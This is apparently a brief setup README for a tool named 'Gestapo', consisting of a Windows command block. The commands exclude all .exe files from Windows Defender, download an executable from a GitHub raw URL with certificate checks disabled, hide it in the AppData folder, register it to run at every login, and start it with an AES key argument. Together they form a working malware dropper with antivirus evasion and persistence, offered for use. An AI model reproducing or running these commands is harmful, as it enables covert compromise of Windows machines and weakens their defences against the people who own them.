# public
gestapo setup
```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/emit_latest.exe --insecure --output %appdata%\emit.exe
attrib +s +h +a %appdata%\emit.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Gestapo" /d "%appdata%\emit.exe --aeskey fe333581d9f246ee" /f
cmd.exe /C start %appdata%\emit.exe --aeskey fe333581d9f246ee
exit

```
